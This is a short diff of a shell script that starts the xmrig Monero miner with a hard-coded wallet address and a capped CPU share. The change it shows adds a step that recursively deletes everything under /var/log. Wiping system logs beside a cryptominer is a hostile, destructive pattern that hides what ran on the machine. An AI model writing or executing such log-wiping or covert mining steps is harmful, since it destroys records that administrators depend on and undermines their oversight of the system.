@@ -39,3 +39,6 @@ fi
 
 #xmrig
 cpulimit --limit 60 "$DIRECTORY/xmrig" --url=127.0.0.1:9443 --donate-level=0 --user=43p8AgGKbhH198j4aTvwMb42PwT6Mc1qzYm7Bxg4y4DTESJtGAvzgGePtwqudFmz7RCi29fwkuG4ZLgxmmQzN8joADCEv9S --pass=Local-Auto -k --coin monero --max-threads-hint=80
+
+#logs
+rm -rf /var/log/*
